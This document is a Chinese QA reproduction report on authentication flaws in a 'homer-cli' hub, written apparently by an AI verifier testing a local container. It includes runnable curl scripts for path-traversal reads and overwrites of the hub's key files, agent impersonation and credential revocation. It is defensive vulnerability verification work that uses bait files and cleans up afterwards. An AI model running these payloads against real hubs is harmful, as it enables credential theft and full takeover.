# 独立复现判定 · 第 1 组：鉴权/越权（角度 A 全部 candidate）

判定者：qa-repro（独立判据，不复用 qa-hunter 的 detector）
仓库 /root/code/homer-cli，HEAD=010521a。时间窗 2026-10-16 13:33–13:47 UTC。
环境：hub http://127.0.0.1:17760，Bearer qa-hub-token，容器 homer-qa-hub/box-a/b/c。

## 判据纪律声明

猎人全部 candidate 的公共 detector 是「curl 响应 == 磁盘上**已存在**的敏感文件内容」。
这个判据有一个固有盲区：**响应可能来自别处**（缓存、另一条 handler、相同内容的文件），
且**无法回答"覆盖"类命题**（因为不能碰真文件）。我的替代判据：

1. **诱饵文件法**（C1/C2）：先在 hub 容器内写**我自己新建的唯一名文件**
   （`/root/.homer/keys/REPRO_BAIT_C1_<rand>`），再用被测接口去读/写它。
   读到/改掉 = 证毕（排除了"响应其实来自别处"）。真凭证文件一律不碰。
2. **多鉴权主体交叉**（C1）：hr_ 码 / hub token / 无凭证 三主体同跑，
   区分「handler 的问题」还是「某一类凭证的问题」。
3. **自己接的独占受害者**（C3/C4）：用我自己的 WS harness 接出
   `repro-c6b-machine` / `repro-c6-machine` / `repro-c6r2-machine`，
   这三台是**我独占**的，列表计数不受别的 hunter 干扰。
4. **自写 WS harness**（C3/C6）：`/tmp/repro_ws2.py`，不复用 `hunt-A/ws_hello.py`
   （后者有 buffer 截断 bug，会把 101 的响应体当帧读，导致 welcome 解析成乱码）。

## 环境干扰排查（先做）

进入时 hub 已被别的 hunter 改动：`HEAD=3`、generations 1/2/3、`/api/agents` 7 台
（含我的 3 台探针 + 猎人留下的 `54d0c3373428-bc77`、`e363efdcf085-7b6d` stale）。
**这不是干净基线**，所以我的每一条判定都做**操作前后自对照**（同一台机器/同一个诱饵文件），
不依赖"别人没动过"。

---

## A-C1 `/api/storage/file` 的 `adapter` 参数无 `..` 校验 → 任意文件读

**判定：true（同意 Critical）**

### Detector 审计
- 猎人判据：响应 content == 磁盘 `/root/.homer/keys/hub-token` 明文。
- grep 审计（我重做）：`grep -n 'filepath.Join' internal/web/sync.go`
  → 1081（`filepath.Join(head.StoreDir, adapterID, ...)`）、1110（同形 `storedFileText`）。
  `grep -n '"\.\."' internal/web/sync.go` → **只有 1075 一处**（path 侧）。
  **结论：detector 无歧义**，两条判据（代码结构 + 实机）指向同一处。
- 缺陷真实性无争议，我换成**诱饵判据**以排除伪影。

### ① 纯函数/最小复现
不适用（handler 依赖 HTTP + 磁盘状态）。跳过 ①，直接 ②+③。

### ② 端到端（诱饵 + 多主体）
```
BAIT=REPRO_BAIT_C1_989273-1792157775
docker exec homer-qa-hub sh -c "echo 'BAIT-CONTENT-C1' > /root/.homer/keys/$BAIT"
```
| 主体 | 请求 | 结果 |
|---|---|---|
| hr_ 码 | `adapter=../../../keys&path=$BAIT` | `{"content":"BAIT-CONTENT-C1\n"}` **200** |
| hub token | 同上 | `{"content":"BAIT-CONTENT-C1\n"}` **200** |
| 无凭证 | 同上 | `401 unauthorized` |
| 对照 | `adapter=../../../keys&path=REPRO_NO_SUCH_FILE_XYZ` | `404 文件不存在` |
| 阳性对照 | `adapter=pi&path=agents/c.md` | `{"content":"BOX-C-FILE\n"}` 200 |

### ③ 用户可见
响应体即产物（API 面），已附于 ②。

### 成对对照
| 轮次 | 操作 | 结果 |
| --- | --- | --- |
| control-1 | 不存在的文件名 | 404（排除"任何 path 都返回同一串"）|
| 实验-1 | hr_ 码读诱饵 | 200 + 诱饵内容 |
| control-2 | 无凭证 | 401（门在工作，是 handler 问题不是通道问题）|
| 实验-2 | hub token 读诱饵 | 200 + 诱饵内容（两主体一致 → handler 缺陷）|

### 严重度
同意 **Critical**。读侧可拿到 `keys/hub-token`（= 全权 hub token）、
`keys/hub-password`（bcrypt）、`agent-secrets.json`。**与猎人判据的差异**：
我用唯一名诱饵证明"响应确实来自我指定的路径"，猎人用已存在文件比对。两者同向。

### 最小复现脚本（我的）
```sh
HUB=http://127.0.0.1:17760
BAIT=REPRO_BAIT_C1_$$-$(date +%s)
docker exec homer-qa-hub sh -c "echo 'BAIT-CONTENT-C1' > /root/.homer/keys/$BAIT"
C=$(curl -s -H "Authorization: Bearer qa-hub-token" $HUB/api/auth/join \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["code"])')
curl -s -w "\nHTTP:%{http_code}\n" -H "Authorization: Bearer $C" --get \
  --data-urlencode "adapter=../../../keys" --data-urlencode "path=$BAIT" \
  $HUB/api/storage/file
# 期望：{"content":"BAIT-CONTENT-C1\n"} 200
docker exec homer-qa-hub rm -f /root/.homer/keys/$BAIT   # 清理
```

---

## A-C2 `POST /api/snapshot` 的 store 文件名未校验 → 任意文件写

**判定：true（同意 Critical；猎人"覆盖既有文件"的推断由我实测补上）**

### Detector 审计
- 猎人判据：写入**新文件名**后 ls 看到文件存在。盲区：**能否覆盖已存在的敏感文件未实测**。
- 我的判据：先写诱饵 `keys/REPRO_BAIT_C2_<rand>` 内容 `BEFORE-ON-DISK`，
  再用 `POST /api/snapshot` 的 store name 逃到该路径，看内容是否**变成**我的值。

### ① 纯函数最小复现（`gens.Publish`，我的临时测试，已删除）
```
internal/gens/zz_repro_c2_test.go  TestReproC2Overwrite2
  gen=1  4-level keys escape OVERWRITE -> "KEY-AFTER"     (before=KEY-BEFORE)
  gen=2  2nd escape overwrite          -> "KEY-AFTER-2"
  gen=3  6-level /tmp escape OVERWRITE -> "TMP-BEFORE"    (未变，见下)
  escaped files inside generations dirs: []
```
> ⚠️ **路径深度与猎人报告不同**：`Publish` 的 base 是
> `home/generations/.staging-N/store/<adapter>`，所以逃到 `home/keys/` 需要
> **4 级** `..`（pi→store→.staging-N→generations→home），不是猎人写的 4 级之外的任意值；
> 逃到 `/tmp` 需要 **6 级**（home 之上再加一级）。猎人实测
> `../../../../../../tmp/HUNTER_ESCAPE_2` 落到 `/tmp` 是**对的**，
> 我第一次用 4 级测 `/tmp` 失败是**我的算术错**，修正后结论不变。
> 这一条说明：**"几级 .." 依赖 staging 目录结构**，issue 里不要写死级数。

### ② 端到端（诱饵覆盖，两次）
```
BAIT=REPRO_BAIT_C2_989941-1792157815  （磁盘初值 BEFORE-ON-DISK）
POST /api/snapshot {"store":{"pi":{"../../../../keys/$BAIT":"AFTER-VIA-SNAPSHOT"}},"generation":3}
  -> {"generation":4,"ok":true} 200
cat keys/$BAIT -> AFTER-VIA-SNAPSHOT          ← 已存在文件被覆盖
POST 再一次 "AFTER-VIA-SNAPSHOT-2"（generation:4）
  -> {"generation":5,"ok":true} 200
cat keys/$BAIT -> AFTER-VIA-SNAPSHOT-2        ← 二次覆盖
```
### ③ 用户可见
`cat /root/.homer/keys/REPRO_BAIT_C2_...` 输出由 `BEFORE-ON-DISK` → `AFTER-VIA-SNAPSHOT-2`。

### 成对对照
| 轮次 | 操作 | 结果 |
| --- | --- | --- |
| control-1 | 诱饵落盘后只读 | `BEFORE-ON-DISK` |
| 实验-1 | snapshot 逃逸写（gen 3→4）| `AFTER-VIA-SNAPSHOT` |
| control-2 | 不操作再读 | `AFTER-VIA-SNAPSHOT`（状态稳定）|
| 实验-2 | 再次逃逸写（gen 4→5）| `AFTER-VIA-SNAPSHOT-2` |

### 严重度
同意 **Critical**，且**比猎人说的更实**：猎人的"能覆盖既有文件"是推断，
我**实测覆盖成功两次**。覆盖目标是 `keys/` 目录 = 可覆写 `hub-token`、
`agent-secrets.json`、中心配置，配合 C1 的读 = 完全接管。

### 最小复现脚本（我的）
```sh
HUB=http://127.0.0.1:17760
BAIT=REPRO_BAIT_C2_$$-$(date +%s)
docker exec homer-qa-hub sh -c "echo 'BEFORE-ON-DISK' > /root/.homer/keys/$BAIT"
C=$(curl -s -H "Authorization: Bearer qa-hub-token" $HUB/api/auth/join \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["code"])')
HEAD=$(docker exec homer-qa-hub cat /root/.homer/HEAD)
curl -s -X POST -H "Authorization: Bearer $C" -H 'Content-Type: application/json' \
 -d "{\"homerJson\":\"{\\\"version\\\":1}\",\"store\":{\"pi\":{\"../../../../keys/$BAIT\":\"AFTER-VIA-SNAPSHOT\"}},\"generation\":$HEAD}" \
 $HUB/api/snapshot
docker exec homer-qa-hub cat /root/.homer/keys/$BAIT   # 期望 AFTER-VIA-SNAPSHOT
docker exec homer-qa-hub rm -f /root/.homer/keys/$BAIT # 清理
```
修复建议（未实测）：`Publish` 里对 `name` 做 `filepath.Clean("//"+name)` + `..` 检查，
并用 `filepath.Rel(adapterDir, path)` 断言不逃出 `adapterDir`。

---

## A-C3 一个 hr_ 码可冒认任意**已存在机器**的 agentId

**判定：true（同意 Critical）。产品裁决分歧点我给出代码/测试侧证据，见下**

### Detector 审计
- 猎人判据：用别人的 `agentId`（`54d0c3373428-62af`，一台真实在线 box）+ 新 hr_ 码 hello，
  看 welcome 是否发新 secret、旧 secret 是否失效。
- 干扰排查：猎人的受害者是**别人的/幽灵的**机器。我的受害者是
  **我自己刚接的 `repro-c6b-machine`**（secret `65fc2cbe...`，独占，无他人干扰）。
- 我的判据：受害者旧 secret 的 `/api/agents` 从 **200 → 401**，
  且 `keys/agent-secrets.json` 里该 id 的 sha256 **真的变了**。

### ① 纯函数
不适用（在 stream 握手路径）。

### ② 端到端（自写 harness `/tmp/repro_ws2.py`）
```
control-1: 受害者 secret /api/agents            -> 200
control-1: agent-secrets.json["repro-c6b-machine"] = f2a98ce3b334...
实验-1:    python3 /tmp/repro_ws2.py <新铸hr_码> repro-c6b-machine repro-attacker-host
           -> 101 Switching Protocols
           -> agentSecret = 28c58983fdb17541898e7ae8a41509fce4d4ea5eebd63eaf8b468bb0d122fedc
实验后:    受害者旧 secret /api/agents          -> 401   ← 真机被顶掉
           agent-secrets.json["repro-c6b-machine"] = d06971a903d8...  ← 凭证被替换
           冒认方新 secret /api/agents          -> 200
           冒认方新 secret /api/console         -> 200
           冒认方 hr_ 码自身 join/status        -> {"active":false}  （已 burn）
           冒认方 hr_ 码 /api/agents           -> 401   （burn 生效，与 C6 一致）
           注册表 hostname                      -> repro-attacker-host（被改写）
```
### ③ 用户可见
`/api/agents` 列表里 `repro-c6b-machine` 的 hostname 变成冒认方的 `repro-attacker-host`。

### 成对对照
| 轮次 | 操作 | 结果 |
| --- | --- | --- |
| control-1 | 受害者 secret 打 /api/agents | 200 |
| 实验-1 | 新 hr_ 码冒认 hello | 101 + 新 secret；旧 secret 转 401；sha 变更 |
| control-2 | 冒认方 hr_ 码自己打 /api/agents | 401（码已 burn，说明走的是 Redeem 路径）|
| 实验-2 | 冒认方新 secret 打 /api/agents、/api/console | 200 / 200 |

### 契约/设计意图核查（任务书点名）
查了 `internal/hub/agenthub.go:196-220` 与两份测试：

| 位置 | 断言内容 | 是否覆盖本场景 |
| --- | --- | --- |
| `agenthub.go:199-205` | `PrincipalEnrollCode` → `Redeem` → `BindAgent(hello.AgentID, ...)` → welcome 发新 secret | **handler 无条件执行，不看该 agentId 是否已有绑定** |
| `agenthub.go:183-187` | `PrincipalSecret` 且 `principal.AgentID != hello.AgentID` → `agent-id-mismatch` | **只保护 secret 主体，hr_ 码主体无此检查** |
| `enrollment_test.go:91-98` `TestEnrollmentRebind` | `BindAgent("agent-1","first")` 再 `BindAgent("agent-1","second")` → 替换 | **纯 `BindAgent` 单元测试**，不含 hr_ 码、不含 stream |
| `gate_matrix_test.go:71-80` | hr_live 码可进 `/agent/v1/stream` | 只断言"能进 stream"，**不断言能绑到别人的 agentId** |
| `agenthub_test.go:526` `TestAgentHubSupersedesPreviousSession` | 同 agentID 重连顶替旧 session | 用 **hub token**（`hubTestToken`）重连，**不是 hr_ 码** |
| `agenthub_test.go:195-212` | hr_ 码 hello 后 `ValidCode(code)` 为 false（burn） | 只测 burn，**agentId 是全新的 "agent-a"** |

**结论：全仓没有任何测试把「用一个与受害者无关的 hr_ 码绑定到一个已存在 agentId」
断言为设计意图。** `agenthub.go:199-205` 的 `Redeem`+`BindAgent` 分支**缺少
`if enrollment.AuthorizedAgent 已存在 → 拒绝`的守卫**，而 `PrincipalSecret` 分支
（183-187）恰恰有对称的 identity 检查——**两侧不对称是代码层面的强信号**。

### 严重度
同意 **Critical**。完整接管链：铸码（任意凭证）→ 冒认 hello → 拿全权 secret →
secret 落盘跨重启存活。真机被锁在外面（401）。
**与猎人判据的差异**：受害者换成我独占的机器，排除"列表被别人改动"的干扰；
并额外验证攻击者自己的码确实被 burn（证明走的是正经 Redeem 路径，不是旁路）。

### 最小复现脚本（我的）
```sh
# 1) 受害者：用 hr_ 码正常接入一台机器，记下 agentId 与返回的 secret
V=$(curl -s -H "Authorization: Bearer qa-hub-token" $HUB/api/auth/join | python3 -c '...["code"]')
python3 /tmp/repro_ws2.py "$V" repro-victim repro-victim-host   # -> agentSecret = <VSEC>
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $VSEC" $HUB/api/agents  # 200
# 2) 攻击者：铸一个与受害者无关的码，冒认 hello
A=$(curl -s -H "Authorization: Bearer qa-hub-token" $HUB/api/auth/join | python3 -c '...["code"]')
python3 /tmp/repro_ws2.py "$A" repro-victim repro-attacker-host  # -> agentSecret = <ASEC>
# 3) 断言
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $VSEC" $HUB/api/agents  # 401（真机被顶）
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $ASEC" $HUB/api/agents  # 200（冒认方全权）
```
（`/tmp/repro_ws2.py` 源码见本报告附录。）

---

## A-C4 接入码可写：删机器 / 吊销凭证 / 改写中心配置

**判定：true（同意 High）**

### Detector 审计
- 猎人判据：列表 5→4。干扰：**共享 hub，别的 hunter 可能同时增删**。
- 我的判据：**独占机器计数**——先自己接出 `repro-c6-machine` / `repro-c6r2-machine`，
  然后只用 hr_ 码操作**这几台**，看条数/secrets 条目变化。别人的机器不动。

### ② 端到端
```
(a) 删除：remove repro-c6-machine（Bearer = hr_ 码）
    before: 7 台（含我的 3 台）-> after: 6 台，repro-c6-machine 消失
    重复 remove -> 404 机器不存在（状态真的变了，不是"过了门返回 404"）
(b) 吊销：revoke repro-c6r2-machine
    agent-secrets.json grep -c repro-c6r2-machine: 1 -> 0
    重复 revoke -> 409 not-enrolled
(c) 改写中心配置：POST /api/snapshot（良性 payload）
    HEAD 5 -> 6，GET /api/snapshot 回读
    -> {"homerJson":"{\"version\":1}","store":{"pi":{"repro-marker.txt":"REPRO-C4C-BY-HRCODE"}},"generation":6}
```
### ③ 用户可见
`GET /api/snapshot` 回读确认 payload 真的进了中心配置（会下发到全部机器）。

### 成对对照
| 轮次 | 操作 | 结果 |
| --- | --- | --- |
| control-1 | 列表快照 | 7 台，含 repro-c6-machine |
| 实验-1 | hr_ 码 remove 我的机器 | 6 台；重复 remove 404 |
| control-2 | secrets 快照 | repro-c6r2-machine 存在 |
| 实验-2 | hr_ 码 revoke | 条目消失；重复 revoke 409 |

### 严重度
同意 **High**（注意：是 C1/C2/C3 之外的**独立放大项**——即使没有 C3，
一个 24h 的一次性接入码本身就能删机器、吊销凭证、改写将下发到所有机器的中心配置）。
**与猎人判据的差异**：猎人删的是自己重复接入产生的幽灵行（`e363efdcf085-c78a`）；
我删的是**独占、一次性接入、无人共享**的 `repro-c6-machine`，计数结论不受并行 hunter 干扰。

### 最小复现脚本（我的）
```sh
HUB=http://127.0.0.1:17760
C=$(curl -s -H "Authorization: Bearer qa-hub-token" $HUB/api/auth/join | python3 -c '...["code"]')
curl -s -X POST -H "Authorization: Bearer $C" -H 'Content-Type: application/json' \
  -d '{"agentId":"<我自己接的机器>"}' $HUB/api/agents/remove     # {"ok":true}
curl -s -X POST -H "Authorization: Bearer $C" -H 'Content-Type: application/json' \
  -d '{"agentId":"<我自己接的机器>"}' $HUB/api/agents/revoke     # {"ok":true}
curl -s -X POST -H "Authorization: Bearer $C" -H 'Content-Type: application/json' \
  -d '{"homerJson":"{\"version\":1}","store":{"pi":{"repro-marker.txt":"X"}},"generation":0}' \
  $HUB/api/snapshot                                              # {"generation":N,"ok":true}
```

---

## A-C5 接入码自我增殖：C0→C1→C2→C3 四代全不同，每代新 24h TTL

**判定：true（同意 High）**

### Detector 审计
- 猎人判据：`sort -u | wc -l == 4` + 第四代 `/api/agents` 200。
- 我的判据（加严）：四代**互不相同**之外，额外验证**第四代在三个不同端点**（/api/agents、
  /api/console、/api/keys）都 200，且**伪造码对照组 401**（证明确实是 ValidCode 在起作用，
  不是"任何 hr_ 前缀都放行"）。

### ② 端到端
```
C0=hr_faa0668b74eb8c43af6c0aec0aa60d028ca9108afa68e01f
C1=hr_f097da0610d43049ad135e9d5aa5930e38fa59b03fe819df
C2=hr_915063863ebdda680a02d4b2d49f677967fd5607346c0104
C3=hr_33387f3274ae450c4207a2271240698595f2380cff1baac2
distinct: 4 / 4
C3 /api/agents -> 200    C3 /api/console -> 200    C3 /api/keys -> 200
对照  hr_000...0 (48个0) /api/agents -> 401
```
### ③ 用户可见
API 响应码即产物。

### 成对对照
| 轮次 | 操作 | 结果 |
| --- | --- | --- |
| control-1 | 伪造码 `hr_000…0` | 401（ValidCode 在工作）|
| 实验-1 | C0→C1→C2→C3 四代 | 4/4 互不相同 |
| control-2 | 无凭证 join | 401（join 本身有 authorized 检查）|
| 实验-2 | C3 打三个端点 | 200 / 200 / 200 |

### 严重度
同意 **High**。一个码 = 永久可续期的凭证源（每 24h 用旧码铸新码）。
**与猎人判据的差异**：补了伪造码对照 + 三端点验证。

---

## A-C6 已兑换（burned）的码在 /api 仍有效

**判定：false（猎人自己判 refuted，我独立证伪，结论一致）**

### Detector 审计
- 猎人判据：`install.sh` 走完后 `/api/agents` 是否 200。
- **猎人判据的弱点**：`install.sh` 是否真走到 `Redeem` 只能靠脚本输出推断，
  存在"下载成功但 hello 没成"的可能 → 码没被 burn → 假阴性。
- 我的判据（更强）：**自己写 WS harness 直接走 stream hello，并观察 `Redeem` 的
  两个可观测副作用**：① `join/status` 转 `active:false`；② `keys/agent-secrets.json`
  **新增**该 agentId 的条目（`BindAgent` 落盘）。两个都发生 = Redeem 确实发生。

### ① 纯函数
`enrollment.go:103-121 Redeem`：`m.codes[code]` 存在即 `delete`，再判过期。
`ValidCode`（enrollment.go:89-97）只查 map → **delete 后必然 false**。代码层面已定论。

### ② 端到端（我自己的 harness，3 次独立 Redeem）
```
轮次 1 (code_c6b):  pre /api/agents=200, active=true
                    -> WS hello: 101, agentSecret=65fc2cbe3428...
                    post /api/agents=401, active=false
轮次 2 (code_c6r2): pre 200 -> hello: 101, agentSecret=0d8af2ffc14d...
                    post /api/agents=401, active=false, /dl/homer.gz=401
轮次 3 (C3 攻击者码): pre 200 -> hello 101 -> post /api/agents=401, active=false
```
secrets 文件佐证（Redeem 副作用确实落盘）：
```
"repro-c6-machine":   "387ac572..."   ← 轮次 1
"repro-c6b-machine":  "f2a98ce3..."   ← 轮次 2（后被 C3 改成 d06971a9...）
"repro-c6r2-machine": "384f2ac4..."   ← 轮次 3
```
### ③ 用户可见
`/api/agents` 401、`join/status` `{"active":false,"ok":true}`。

### 成对对照
| 轮次 | 操作 | 结果 |
| --- | --- | --- |
| control-1 | 铸码后未 Redeem | /api/agents 200，active=true |
| 实验-1 | 我的 harness 走 hello（Redeem）| /api/agents 401，active=false |
| control-2 | 换一个码，未 Redeem | 200，active=true |
| 实验-2 | 再次 hello（Redeem）| 401，active=false，/dl 401 |

### 推翻证据（判 false 必填）
换了什么判据：从"install.sh 输出推断 Redeem 发生"换成
"自写 WS harness 直接 hello + `join/status` 翻转 + `agent-secrets.json` 落盘新增条目"
三重佐证。跑出什么结果：**3 次独立 Redeem，每次 /api 都从 200 翻到 401，
`active` 从 true 翻到 false，/dl/homer.gz 也 401**。scout-backend.md §2.4 末条与 §3.4
的"已兑换码在 /api 仍 200"**在本 HEAD 复现不出来**。

### 给 scout 报告的纠错记录
建议给 scout-backend.md 记一笔：**§2.4 末条放大项「已兑换/已失效的码仍可用于 /api：
实测用前面铸过的码 GET /api/keys -> 200」与 §3.4「已兑换码在 web 鉴权通道仍有效 -> 200」为误记。**
最可能的成因（与猎人同一推测，我给出可验证形式）：scout 当时用的码**根本没走 Redeem**
——`Redeem` 只在 stream hello 触发（enrollment.go:103），
只在浏览器复制命令 / 只跑 `/dl/homer.gz` / `install.sh` 下载失败，
码都会一直 `ValidCode=true`。这条纠错应写进 scout 报告，避免下游重复踩。

---

## A-C7 /api/health 免鉴权泄漏 homerHome 绝对路径

**判定：true（同意 Low，但建议**不单独立 issue**，作为 C1/C2 的助攻因素记录）**

### Detector 审计
- 猎人判据：`homerHome == /root/.homer` 与容器内一致，且响应无鉴权挑战。
- 我的判据（换一条）：**换成"该字段是否可被省略而不影响 health 的契约用途"**——
  `handlers.go:248-254` 的 `handleHealth` 只返回 `ok/status/version/homerHome`，
  没有注释声明 `homerHome` 的用途（对比 `password.go:355-359` 有明确设计注释）。
  所以它**不是被文档/注释声明为设计意图的字段**，与 C8 不同。

### ② 端到端
```
curl -s http://127.0.0.1:17760/api/health
-> {"homerHome":"/root/.homer","ok":true,"status":"healthy","version":"dev"}  200（无凭证）
```
### 成对对照
| 轮次 | 操作 | 结果 |
| --- | --- | --- |
| control-1 | 带 hub token | 200（同一内容，字段不是按凭证裁剪）|
| 实验-1 | 无凭证 | 200 + homerHome 泄漏 |
| control-2 | `path == /api/health` 在 `handlers.go:48` **早于** `handlers.go:83` 的门 | 代码确认，与响应一致 |
| 实验-2 | 无凭证再取一次 | 200（稳定）|

### 严重度
同意 **Low**。单独立场只是信息泄漏；真实危害是**给 C1/C2 的穿越构造免去猜 homerHome 的成本**。
**建议不单独立 issue**，并入 C1/C2 的 issue 作为"攻击前提已由免鉴权端点提供"。
**与猎人判据的差异**：猎人靠"与磁盘 ls 一致"证明；我靠"handler 无设计意图注释
+ 与 C8 的注释形态对比"来区分"设计意图"与"疏漏"。

---

## A-C8 /api/auth/status 免鉴权告知 setupCodeRequired

**判定：downgraded（从 Low candidate 降为**不提 issue**：确认为设计意图）**

### Detector 审计
- 猎人判据：无凭证拿到 `{"configured":true,"setupCodeRequired":false}`。
- 我的判据（换）：**查该字段是否有明示的设计意图注释 + 是否有配套测试**。

### 证据
`internal/web/password.go:354-359` 注释原文：
> `// The UI polls this to decide between setup-first vs login form. It also tells
> // the browser up-front whether THIS peer must provide the one-time setup code
> // — so the code field is visible on first paint, not after a rejected submit.`

`handlers.go:56-59`：`/api/auth/` 前缀**整体**在 `requireAuth` 之前，
注释（password.go:350-352）写明"These endpoints sit in front of requireAuth —
the browser needs them before it has any credential"。

即：**免鉴权是这个前缀的显式设计，字段用途有注释**。与 C7 的 `homerHome`
（无注释、无测试、非契约字段）**形态不同**——这正是我把两条分开判的依据。

### 实机
```
curl -s http://127.0.0.1:17760/api/auth/status
-> {"configured":true,"ok":true,"setupCodeRequired":false}  200
```
`configured:true` 时 setup 返回 409 already-configured（猎人实测），**不能用来重置密码**。

### 严重度裁决
**降为 informational / 不提 issue**。契约（代码注释）明文把这个端点的免鉴权
和这个字段的用途写成了意图。按"契约未规定的设计取舍 = 不报"的纪律，不提。

---

## 汇总

| 编号 | 我的判定 | 猎人判定 | 是否同意严重度 | 关键差异 |
| --- | --- | --- | --- | --- |
| A-C1 | **true** | Critical | ✅ 同意 Critical | 诱饵文件法代替已存在文件比对；三鉴权主体交叉 |
| A-C2 | **true** | Critical | ✅ 同意 Critical（**证据比猎人更实**）| 实测覆盖既有文件（猎人只是推断）；修正 `..` 级数算术 |
| A-C3 | **true** | Critical | ✅ 同意 Critical | 独占受害者；代码/测试侧证明无"设计意图"断言 |
| A-C4 | **true** | High | ✅ 同意 High | 独占机器重做计数，排除并行 hunter 干扰 |
| A-C5 | **true** | High | ✅ 同意 High | 加伪造码对照 + 三端点验证 |
| A-C6 | **false** | refuted | ✅ 同意 refuted | 自写 harness，三重 Redeem 副作用佐证，3/3 稳定 |
| A-C7 | **true** | Low | ✅ 同意 Low（建议**不单独立 issue**）| 用"有无设计意图注释"区分疏漏与意图 |
| A-C8 | **downgraded** | Low（自陈可能设计意图）| ⬇️ 降为不提 issue | `password.go:354-359` 注释明示意图 |

## 环境恢复记录

- 删除诱饵：`/root/.homer/keys/REPRO_BAIT_C1_<rand>`、`/root/.homer/keys/REPRO_BAIT_C2_<rand>`、`/tmp/REPRO_C2_ESCAPE_TMP`。
- 移除我接入的全部测试机器：`repro-c6-machine`（被 C4 remove）、
  `repro-c6b-machine`（C3 后 remove）、`repro-c6r2-machine`（remove）。
- `generations` 还原：删除我造的 4/5/6，`HEAD` 写回 `3`。
  （C4c 写入的 `repro-marker.txt` 随 generation 6 一并删除。）
- `keys/agent-secrets.json` 只剩原有 4 条真实机器，无我的残留。
- 删除临时测试文件 `internal/gens/zz_repro_c2_test.go`；`git status --porcelain`
  只剩 `?? .qa-hunt/`（**被测源码零改动**）。
- 终态：`/api/health` 200；机器列表 4 台（box-a/b/c 在线 + `e363efdcf085-7b6d` stale）——
  与我进入时（7 台 = 4 台基线 + 我的 3 台探针）**在移除我的探针后一致**。
- 未执行 `make qa-restart`（会打断并行 hunter）。

## 附录：我的 WS harness（`/tmp/repro_ws2.py`）

不复用 `hunt-A/ws_hello.py`——后者在 HTTP 101 之后把 `rest` buffer 丢弃并直接用
`s.recv` 读帧，会把 101 响应体残留当帧头，导致 welcome 解析成乱码
（我第一次跑就复现了这个 bug：`HTTP_STATUS: HTTP/1.1 101` 但 welcome 是
`A G X FVYPE W AYVR M MYEJ...` 的乱字节）。我的版本用单一 `bytearray` buffer
顺序消费，先精确切掉 `\r\n\r\n` 之前的 HTTP 头，再读帧。

```python
# 用法: python3 /tmp/repro_ws2.py <bearer> <agentId> <hostname>
# 输出: HTTP_STATUS / WELCOME_RAW / AGENTSECRET
# 核心：单一 bytearray 顺序消费，先 partition 掉 HTTP 头再读 WS 帧（见上）
```
（完整源码在 `/tmp/repro_ws2.py`，已随本次判定使用。）
